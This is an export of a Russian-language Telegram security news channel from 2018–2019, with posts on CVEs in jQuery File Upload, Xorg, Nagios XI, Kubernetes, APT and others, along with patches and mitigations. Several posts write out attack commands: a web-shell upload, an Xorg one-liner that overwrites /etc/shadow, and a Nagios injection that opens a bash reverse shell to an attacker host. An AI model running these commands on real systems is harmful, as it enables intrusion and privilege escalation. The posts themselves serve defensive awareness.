
       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="24.10.2018 11:15:42">
11:15
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;веб&quot;)">#веб</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br><strong>jQuery File (maybe Shell) Upload</strong><br><br>Жили-жили и вот те раз. С 2015 года юзают уязвимость, а комьюнити как бы не в теме.<br><br>Речь конечно про загрузку произвольных файлов в jQuery File Upload, в том числе .php с возможностью исполнения (CVE-2018-9206).<br><br>jQuery-плагин jQuery File Upload обеспечивает виджет для загрузки файлов на сайты, поддерживающий групповую загрузку, индикатор прогресса и возобновление прерванных загрузок. Прилагается также набор примеров серверных обработчиков для сохранения отправляемых файлов. Так вот эти обработчики никак не проверяют тип загружаемого файла. Файл сохраняется с заданным пользователем именем в директории .<a href="" onclick="return ShowBotCommand(&quot;files&quot;)">/files</a> и в общем случае доступен для запроса.<br><br>В составе плагина предусмотрен .htaccess, который должен ограничивать выполнение .php файлов директивами <code>SetHandler default-handler</code>, <code>ForceType application/octet-stream</code>. Однако это будет работать только при соответствующих разрешениях в AllowOverride (FileInfo) и активном модуле mod_headers.<br><br>Так как плагин очень популярен, проблема расползлась по огромному множеству приложений и форков с некоторыми модификациями, но чаще без. Тут <a href="https://github.com/lcashdol/Exploits/tree/master/CVE-2018-9206">https://github.com/lcashdol/Exploits/tree/master/CVE-2018-9206</a> доступен скрипт, который проверяет наличие уязвимости в трех наиболее распространенных вариациях, ну и шелл пытается загрузить, для надежности проверки.<br><br>В базом варианте загрузка элементарная:<br><br><code>curl -F &quot;files=@shell.php&quot; http://localhost/jQuery-File-Upload-9.22.0/server/php/index.php</code><br><br>Уязвимость исправлена в версии 9.22.1 (и 9.24.1, но там все немного по другому) - добавлено ограничение типов загружаемых файлов и теперь по умолчанию можно загружать только GIF, JPEG и PNG.
       </div>

      </div>

     </div>

     <div class="message service" id="message-208">

      <div class="body details">
30 October 2018
      </div>

     </div>

     <div class="message default clearfix" id="message227">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="30.10.2018 12:04:59">
12:04
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;linux&quot;)">#linux</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br><strong>В твиттере плохому не научат</strong><br><br>Быстро набравшая популярность уязвимость CVE-2018-14665 в X.Org Server позволяет повысить привилегии и перезаписывать произвольные файлы. Проблема актуальна только если у Xorg установлен бит setuid. В разных средах он по умолчанию установлен или не установлен. <br><br>Если же setuid установлен, то играет роль недостаточная проверка безопасности параметров <code>-modulepath</code> и <code>-logfile</code>. Первый позволяет подключить произвольный модуль, который выполнится с повышенными привилегиями. Второй - перезаписывать произвольные файлы. Параметр -fp позволяет указать путь к шрифтам, который будет тут же записан в логфайл. Отсюда первый, &quot;базовый&quot; вариант эксплойта с перезаписью shadow:<br><br><code>cd /etc; Xorg -fp &quot;root::16431:0:99999:7:::&quot;  -logfile shadow  :1;su<br><br></code>Другой, без испоганивания shadow, с открытием привилегированного шелла через <a href="ld-linux.so">ld-linux.so</a>: <a href="https://gist.github.com/0x27/d8aae5de44ed385ff2a3d80196907850">https://gist.github.com/0x27/d8aae5de44ed385ff2a3d80196907850</a><br><br>Проблема родилась в версии 1.19.0 и исправлена в 1.20.3. При недоступности обновления для конкретной сборки рекомендуется отключить SUID-бит, имея в виду, что это может привести к ошибкам при запуске через xinit или startx.
       </div>

      </div>

     </div>

     <div class="message service" id="message-209">

      <div class="body details">
2 November 2018
      </div>

     </div>

     <div class="message default clearfix" id="message228">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="02.11.2018 10:35:23">
10:35
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;windows&quot;)">#windows</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a><br><br><strong>Хватит уже Qwerty</strong><br><br>Active Directory Federated Services позволяет перебирать пользователей. Определять, существует ли пользователь, по времени ответа. Microsoft пока вроде не согласился, что это уязвимость. И включение в CVE на рассмотрении. Но наверно включат. И мы то понимаем, какой риск получения пароля, если у атакующего в наличии большой пул учеток.<br><br>Разница в задержке ответа сервера для существующих и несуществующих учеток значительна, впрочем это зависит от размера базы пользователей. Так что нужно сначала замерить время ответа для заведомо существующей и несуществующей учеток. Источник, пример и подробное описание незамысловатого действа: <a href="https://github.com/binary1985/VulnerabilityDisclosure/blob/master/ADFS-Timing-Attack">https://github.com/binary1985/VulnerabilityDisclosure/blob/master/ADFS-Timing-Attack</a><br><br>Пока нет исправления, такие вот дела. Лишний повод напомнить юзерам про сложность паролей.
       </div>

      </div>

     </div>

     <div class="message service" id="message-210">

      <div class="body details">
8 November 2018
      </div>

     </div>

     <div class="message default clearfix" id="message229">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="08.11.2018 10:35:26">
10:35
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;virtualbox&quot;)">#virtualbox</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a><br><br><strong>Учись сражаться за дело рабочего класса!</strong><br><br>Итак, вчера мы имеем раскрытие зиродея в VirtualBox, которое не просто раскрытие, а показательный шаг в борьбе ресечеров с неадекватными условиями багбаунти. Подробно претензии ресечара можно почитать тут: <a href="https://github.com/MorteNoir1/virtualbox_e1000_0day">https://github.com/MorteNoir1/virtualbox_e1000_0day</a><br><br>Уязвимость повзоляет обойти изоляцию гостевых машин и выполнить код на хостовой системе. Присутствует в последней версии VirtualBox 5.2.20 и более ранних. Патча пока нет, но можно защититься конфигурационно. <br><br>Корень проблемы в переполнении буфера в коде эмуляции сетевого адаптера Intel PRO/1000 MT Desktop, который устанавливается в настройках виртуальных машин по умолчанию. Также для проведения атаки требуется режим NAT. Соответственно, если изменить тип адаптера (на PCnet или Paravirtualized Network) или изменить режим NAT на другой - данная атака будет неактуальна.<br><br>Уязвимость проявляется независимо от операционных систем, используемых на стороне хоста и гостевого окружения. Эксплуатация уязвимости требует прав root или администратора на гостевой машине и позволяет выполнить код с правами процесса VirtualBox на хостовой системе. <br><br>Очень подробное описание уязвимости и процесса экплуатации с кодом: <a href="https://github.com/MorteNoir1/virtualbox_e1000_0day">https://github.com/MorteNoir1/virtualbox_e1000_0day</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-211">

      <div class="body details">
20 November 2018
      </div>

     </div>

     <div class="message default clearfix" id="message230">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="20.11.2018 08:15:59">
08:15
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;linux&quot;)">#linux</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;update&quot;)">#update</a><br><br><strong>Linux Kernel CVE-2018-18955</strong><br><br>Интересное повышение привилегий через нэймспейсы и вложенные нэймспейсы из-за недообработки отображений UID/GID, когда их больше пяти. Подробное описание, скрипты для эксплуатации и ее пример: <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1712">https://bugs.chromium.org/p/project-zero/issues/detail?id=1712</a><br><br>Проблема появилась в версии ядра 4.15 и устранена в выпусках 4.18.19 и 4.19.2:<br><a href="https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.18.19">https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.18.19</a><br><a href="https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.19.2">https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.19.2</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-212">

      <div class="body details">
27 November 2018
      </div>

     </div>

     <div class="message default clearfix" id="message231">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="27.11.2018 10:19:08">
10:19
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;windows&quot;)">#windows</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br><strong>Windows LPE CVE-2018-8550</strong><br><br>Свежее повышение привилегий в Windows из-за ряда недостатков безопасности в DfMarshal (COM Aggregate Marshaler).<br>Несколько примеров эксплуатации для Windows 10 1803 раскрываются тут, как и основное описание: <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1644">https://bugs.chromium.org/p/project-zero/issues/detail?id=1644</a><br>И так как проблем несколько, еще дополнительные описания для тех, кому интересны подробности: <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1645">https://bugs.chromium.org/p/project-zero/issues/detail?id=1645</a>, <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1646">https://bugs.chromium.org/p/project-zero/issues/detail?id=1646</a>, <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1647">https://bugs.chromium.org/p/project-zero/issues/detail?id=1647</a>, <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1648">https://bugs.chromium.org/p/project-zero/issues/detail?id=1648</a>.<br><br>Весь набор проблем лечится единым фиксом и получил общий идентификатор CVE-2018-8550. Хотя примеры эксплойтов приведены для Windows 10, уязвимости присутствуют и в других версиях: Windows 7, Windows Server 2012 R2, Windows RT 8.1, Windows Server 2008, Windows Server 2019, Windows Server 2012, Windows 8.1, Windows Server 2016, Windows Server 2008 R2, Windows 10, Windows 10 Servers.<br> <br>Исправления выпущены, перечень KB: <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8550">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8550</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-213">

      <div class="body details">
30 November 2018
      </div>

     </div>

     <div class="message default clearfix" id="message232">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="30.11.2018 10:08:17">
10:08
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;вредонос&quot;)">#вредонос</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br><strong>Троян в зависимостях js-библиотеки</strong><br><br>В одном из релизов (3.3.6) популярной js-библиотеки event-stream была установлена вредоносная зависимость: пакет flatmap-stream 0.1.1. Сама event-stream является зависимостью для ps-tree и npm-run-all и еще нескольких тысяч npm-пакетов.<br><br>Проверить наличие проблемы в своей системе можно легко командой:<br><br><code>npm ls event-stream flatmap-stream</code><br><br>Также разработчикам приложений рекомендуют пока зафиксировать в зависимостях версию event-stream 3.3.4, поскольку в сентябре предыдущий автор библиотеки передал управление новому (right9ctrl), после чего и появилась указанная вредоносная зависимость. На данный момент она удалена из зависимостей, а релиз 3.3.6 отозван из NPM.<br><br>Вредоносный код во flatmap-stream использовался для кражи закрытых ключей от кошельков Copay, которые отправлялись на <a href="copayapi.host">copayapi.host</a> и <a href="111.90.151.134">111.90.151.134</a>.
       </div>

      </div>

     </div>

     <div class="message service" id="message-214">

      <div class="body details">
4 December 2018
      </div>

     </div>

     <div class="message default clearfix" id="message233">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="04.12.2018 11:07:17">
11:07
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;network&quot;)">#network</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br><strong>Защита от атак по IPv6</strong><br><br>Сигнатуры детекта подмены DHCPv6 и адреса WPAD через DNS/IPv6 для Snort и Suricata от Fox-IT Security Research Team:<br><br><code># Snort &amp; Suricata signatures for:</code><br><code># https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6</code><br><code>alert udp fe80::/12 [546,547] -&gt; fe80::/12 [546,547] (msg:&quot;FOX-SRT - Policy - DHCPv6 advertise&quot;; content:&quot;|02|&quot;; offset:48; depth:1; reference:url,blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/; threshold:type limit, track by_src, count 1, seconds 3600; classtype:policy-violation; sid:21002327; rev:2;)</code><br><code>alert udp ::/0 53 -&gt; any any (msg:&quot;FOX-SRT - Suspicious - WPAD DNS reponse over IPv6&quot;; byte_test:1,&amp;,0x7F,2; byte_test:2,&gt;,0,6; content:&quot;|00 04|wpad&quot;; nocase; fast_pattern; threshold: type limit, track by_src, count 1, seconds 1800; reference:url,blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/; classtype:attempted-admin; priority:1; sid:21002330; rev:1;)</code><br><br>Но это всего лишь пара атак. Куда эффективней и надежней целиком отключить IPv6. Вы же им не пользуетесь в самом деле?<br><br>Отключается в параметре SYSTEM\CurrentControlSet\services\TCPIP6\Parameters:DisabledComponents, все отключено - 0xFFFFFFFF (REG_DWORD).<br>Для групповых политик потребуются дополнительные шаблоны. Готовые есть, например, тут: <a href="http://sysadminreference.blogspot.com/2014/01/how-to-disable-ipv6-in-windows-vista.html">http://sysadminreference.blogspot.com/2014/01/how-to-disable-ipv6-in-windows-vista.html</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-215">

      <div class="body details">
11 December 2018
      </div>

     </div>

     <div class="message default clearfix" id="message234">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="11.12.2018 10:52:43">
10:52
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;kubernetes&quot;)">#kubernetes</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br><strong>Первая критическая уязвимость в Kubernetes</strong><br><br>Жутковатая дыра CVE-2018-1002105: после отправки через API запросов не закрывается сетевое соединение. Например, можно отправить discovery-запрос. После этого отправленные через API запросы будут восприняты бэкенд-сервисами как внутренние запросы от сервера API, отправленные с использованием параметров аутентификации сервера API. В результате можно проводить многие операции с бэкендом, в том числе выполнить произвольный код. По умолчанию discovery-запросы доступны даже неавторизованным пользователям, что можно отключить опцией &quot;--anonymous-auth=false&quot;.<br><br>Проблема в обратном прокси в фронтенде Kubernetes. Когда он осуществляет процедуру открытия вебсокета, то не проверяет ответ сервера и создает соединение даже при ответе 404. Клиенту при этом придет 404, но соединение все равно будет открыто. Причем прокси осуществляет аутентификацию собственными кредами, чего достаточно для многих операций бэкендов даже без собственной авторизации пользователя.<br><br>Проблема исправлена в версиях 1.10.11, 1.11.5, 1.12.3 и новом выпуске 1.13.<br><br>Подробное описание бага: <a href="https://rancher.com/blog/2018/2018-12-04-k8s-cve/">https://rancher.com/blog/2018/2018-12-04-k8s-cve/</a><br>Пример эксплойта: <a href="https://github.com/evict/poc_CVE-2018-1002105">https://github.com/evict/poc_CVE-2018-1002105</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-216">

      <div class="body details">
19 December 2018
      </div>

     </div>

     <div class="message default clearfix" id="message235">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="19.12.2018 11:04:29">
11:04
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;wifi&quot;)">#wifi</a> <a href="" onclick="return ShowHashtag(&quot;linux&quot;)">#linux</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br> <br><strong>Обновление от KRACK</strong><br><br>Спустя два года после предыдущей версии 2.6 выпущена версия wpa_supplicant 2.7, в которой устранены уязвимости к атаке KRACK: CVE-2017-13077, CVE-2017-13078, CVE-2017-13079, CVE-2017-13080, CVE-2017-13081, CVE-2017-13082, CVE-2017-13086, CVE-2017-13087, CVE-2017-13088, а также уязвимость CVE-2018-14526, позволяющая получить ключ EAPOL в сетях, использующих WPA2 с TKIP.<br><br>Другие основные изменения, касающиеся безопасности:<br>- Добавлен ряд новых функций: <br>  - аутентификация по общему ключу FILS (Fast Initial Link Setup, стандартизирован как IEEE 802.11ai), <br>  - OWE (Opportunistic Wireless Encryption, RFC 8110, используется в WPA3), <br>  - DPP (Wi-Fi Device Provisioning Protocol, используется в WPA3)<br>- В SAE теперь можно использовать отдельный от WPA2 пароль (требуется, чтобы и точка доступа это поддерживала)<br>- Добавлена поддержка OpenSSL 1.1.1 и wolfSSL<br>- Удален весь функционал PeerKey (был подвержен атаке KRACK)<br>- Различные улучшения доступных криптоалгоритмов: RSA 3072-бит с 192-битной криптографией NSA Suite B, SHA256 в OCSP, SHA384, BIP-CMAC-256, BIP-GMAC-128, BIP-GMAC-256 в FT (Fast Transition, IEEE 802.11r)<br>- Опция ap_isolate для изоляции клиентов в режиме точки доступа (AP mode)<br><br>Вместе выпушена версия 2.7 hostapd с неменьшим расширением функционала и устранением уязвимости к атаке KRACK. Более подробный перечень изменений: <a href="http://lists.infradead.org/pipermail/hostap/2018-December/039069.html">http://lists.infradead.org/pipermail/hostap/2018-December/039069.html</a><br><br>В репозитории Debian, например, обновки уже доступны в ветке experimental.
       </div>

      </div>

     </div>

     <div class="message service" id="message-217">

      <div class="body details">
15 January 2019
      </div>

     </div>

     <div class="message default clearfix" id="message236">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="15.01.2019 11:25:53">
11:25
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;windows&quot;)">#windows</a> <a href="" onclick="return ShowHashtag(&quot;soft&quot;)">#soft</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a><br><br><strong>В то время, как критичный софт обновляется сам</strong><br><br>Еще в конце прошлого года была опубликована информация об уязвимостях в некоторых драйверах ASUS и GIGABYTE. Уязвимости позволяют локально повысить привилегии до полного доступа к системе.<br><br>Перечень известных приложений, включающих уязвимые драйвера:<br> - ASUS Aura Sync v1.07.22 и раньше, а также более поздние версии, в которых исправлена только часть уязвимостей<br> - GIGABYTE APP Center v1.05.21 и раньше<br> - AORUS GRAPHICS ENGINE v1.33 и раньше<br> - XTREME GAMING ENGINE v1.25 и раньше<br> - OC GURU II v2.08<br><br>Проверить наличие уязвимых драйверов:<br><br><code>driverquery /V | findstr /I /C:GPCIDrv /C:GDrv /C:GLCKIo /C:Asusgio</code><br><br>Проверить наличие проблемных приложений:<br><br><code>wmic product get name | findstr /I /C:&quot;ASUS Aura Sync&quot; /C:&quot;GIGABYTE APP Center&quot; /C:&quot;AORUS GRAPHICS ENGINE&quot; /C:&quot;XTREME GAMING ENGINE&quot; /C:&quot;OC GURU&quot;</code><br><br>Выпуск исправлений дается тяжело: ASUS продвигается в устранении дыр, но постепенно, а GIGABYTE утверждает, что он хардварная компания, не особо то занимается софтом, а заявленных уязвимостей в их продуктах нет.<br><br>Описание уязвимостей и коды PoC от ресечеров: <a href="https://www.secureauth.com/labs/advisories/asus-drivers-elevation-privilege-vulnerabilities">https://www.secureauth.com/labs/advisories/asus-drivers-elevation-privilege-vulnerabilities</a>, <a href="https://www.secureauth.com/labs/advisories/gigabyte-drivers-elevation-privilege-vulnerabilities">https://www.secureauth.com/labs/advisories/gigabyte-drivers-elevation-privilege-vulnerabilities</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-218">

      <div class="body details">
23 January 2019
      </div>

     </div>

     <div class="message default clearfix" id="message237">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="23.01.2019 10:01:54">
10:01
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;soft&quot;)">#soft</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br><strong>Неприятности с различными клиентами SCP</strong><br><br>Несколько новых уязвимостей в самых распространенных реализациях клиента SCP (особо важно для тех, кто часто подключается к чужим серверам):<br><strong>CVE-2019-6111</strong> - присутствует в OpenSSH scp &lt;=7.9 - недобросовестный сервер может перезаписать произвольные файлы в целевом каталоге на стороне клиента, а также подкатологи, если выполняется рекурсивное копирование.<br><strong>CVE-2018-20685</strong> - OpenSSH scp &lt;=7.9 и WinSCP &lt;=5.13 - недобросовестный сервер может изменить права доступа к целевому каталогу на стороне клиента.<br><strong>CVE-2019-6109</strong> и <strong>CVE-2019-6110</strong> - OpenSSH scp &lt;=7.9 и PuTTY PSCP - дают серверу возможность манипулировать выводом на стороне клиента через имена объектов и стандартный поток ошибок с помощью управляющих символов ASCII и скрыть действия, произведенные через предыдущие уязвимости.<br><br>Для WinSCP доступна версия с исправлением - 5.14.<br><br>Для OpenSSH исправленной версии пока нет, но есть патч <a href="https://sintonen.fi/advisories/scp-name-validator.patch">https://sintonen.fi/advisories/scp-name-validator.patch</a><br>Либо можно включить и использовать SFTP, входящий в состав OpenSSH:<br><code>Subsystem sftp /usr/lib/openssh/sftp-server</code> (в отдельном процессе)<br>или<br><code>Subsystem sftp internal-sftp</code> (встроенный, в процессе sshd)<br><br>Для PuTTY нет обновлений, но и уязвимости в нем не устрашающие.
       </div>

      </div>

     </div>

     <div class="message service" id="message-219">

      <div class="body details">
31 January 2019
      </div>

     </div>

     <div class="message default clearfix" id="message238">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="31.01.2019 10:33:37">
10:33
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;linux&quot;)">#linux</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a><br><br><strong>Подделка пакетов в APT</strong><br><br>В APT найдена уязвимость, позволяющая подменить пакеты при загрузке по HTTP. Обычно APT проверяет хеши пакетов и их размер по базе метаданных доверенных пакетов, заверенных цифровой подписью. Однако, как оказалось, данную проверку можно обойти. Конечно, у взломщика должен быть доступ к потоку HTTP-трафика. <br><br>Для загрузки данных из репозитория APT запускает дочерний процесс. Взаимодействие между родительским и дочерним процессом происходит с помощью обмена текстовыми командами и данными. Когда загрузка завершена, дочерний процесс отправляет сообщение с уже посчитанными хешами и размером пакета подобное такому:<br><code>201 URI Done</code><br><code>URI: http://deb.debian.org/debian/pool/main/c/cowsay/cowsay_3.03+dfsg2-3_all.deb</code><br><code>Filename: /var/cache/apt/archives/partial/cowsay_3.03+dfsg2-3_all.deb</code><br><code>Size: 20070</code><br><code>Last-Modified: Tue, 17 Jan 2017 18:05:21 +0000</code><br><code>MD5-Hash: 27967ddb76b2c394a0714480b7072ab3</code><br><code>MD5Sum-Hash: 27967ddb76b2c394a0714480b7072ab3</code><br><code>SHA256-Hash: 858d5116a60ba2acef9f30e08c057ab18b1bd6df5ca61c233b6b7492fbf6b831</code><br><code>Checksum-FileSize-Hash: 20070</code><br><br>В тех случаях, когда дочерний процесс получает от репозитория редирект HTTP, он передает родительскому сообщение следующего вида:<br><code>103 Redirect</code><br><code>URI: http://deb.debian.org/debian/pool/main/c/cowsay/cowsay_3.03+dfsg2-3_all.deb</code><br><code>New-URI: http://example.com/new-uri</code><br><br>И значение New-URI тут берется из заголовка Location редиректа HTTP. В нем то и присутствует уязвимость - в него можно включать переносы строк, что позволяет полностью подделать сообщение об успешной загрузке и все хеши в нем. Родительский процесс будет полагаться на эти значения хешей и размера пакета при проверке, хотя по факту был загружен совсем другой пакет.<br><br>Проблема получила идентификатор CVE-2019-3462 и исправлена в версии 1.4.9 APT. Обновленная версия уже доступна в репозиториях Ubuntu и Debian.<br><br>Статья исследователя, включающая еще размышления на тему отключения редиректов и предпочтения HTTPS: <a href="https://justi.cz/security/2019/01/22/apt-rce.html">https://justi.cz/security/2019/01/22/apt-rce.html</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-220">

      <div class="body details">
5 February 2019
      </div>

     </div>

     <div class="message default clearfix" id="message239">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="05.02.2019 11:06:33">
11:06
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;nagios&quot;)">#nagios</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br><strong>Целая лаба для школьников</strong><br><br>В Nagios XI 5.5.6 выявлена сразу пачка простых и эффективных уязвимостей, среди которых удаленное выполнение произвольного кода с правами юзера apache и повышение привилегий, что в комбинации позволяет получить полный доступ к серверу. Доступна версия Nagios XI 5.5.7, в которой данные дыры устранены.<br><br><strong>CVE-2018-15708</strong> - RCE с правами apache. Проблема в Snoopy.class.inc, содержащем такой код:<br><br><code>exec($this-&gt;curl_path.&quot; -D \&quot;/tmp/$headerfile\&quot;&quot;.escapeshellcmd($cmdline_params).&quot; &quot;.escapeshellcmd($URI),$results,$return);</code><br><br>где <code>$URI</code> может быть передан через URI запроса к magpie_debug.php, что позволяет модифицировать команду. Например, следующий запрос приведет к сохранению произвольного файла в /usr/local/nagvis/share, откуда он может быть запущен через веб-интерфейс:<br><br><code>https://x.x.x.x/nagiosxi/includes/dashlets/rss_dashlet/magpierss/scripts/magpie_debug.php?url=https://&lt;attacker_IP&gt;/%20-o%20/usr/local/nagvis/share/exec.php</code><br><br><strong>CVE-2018-15710</strong> - повышение привилегий через параметр addresses в функции autodiscover_new.php. По умолчанию в /etc/sudoers прописываются разрешения запуска данного скрипта с правами рута и без пароля для юзеров apache и nagios. Пример запуска обратного шелла с повышением:<br><br><code>sudo php /usr/local/nagiosxi/html/includes/components/autodiscovery/scripts/autodiscover_new.php --addresses=&apos;127.0.0.1/0;/bin/bash -i &gt;&amp; /dev/tcp/&lt;attacker_IP&gt;/4444 0&gt;&amp;1;&apos;</code><br><br>И еще:<br><br><strong>CVE-2018-15709</strong> - внедрение команд ОС через веб-интерфейс авторизованным пользователем.<br><br><strong>CVE-2018-15711</strong> - повышение привилегий авторизованным пользователем Nagios через переустановку ключей администраторов.<br><br><strong>CVE-2018-15712</strong> - хранимая XSS от лица неавторизованного пользователя.<br><br><strong>CVE-2018-15713</strong> - хранимая XSS от авторизованного пользователя.<br><br><strong>CVE-2018-15714</strong> - отраженная XSS<br><br>Описание уязвимостей, пути, параметры, форматы можно посмотреть тут: <a href="https://www.tenable.com/security/research/tra-2018-37">https://www.tenable.com/security/research/tra-2018-37</a><br>Вариант совмещения и автоматизации для первых двух дыр: <a href="https://www.exploit-db.com/exploits/46221">https://www.exploit-db.com/exploits/46221</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-221">

      <div class="body details">
20 February 2019
      </div>

     </div>

     <div class="message default clearfix" id="message240">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="20.02.2019 10:33:56">
10:33
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
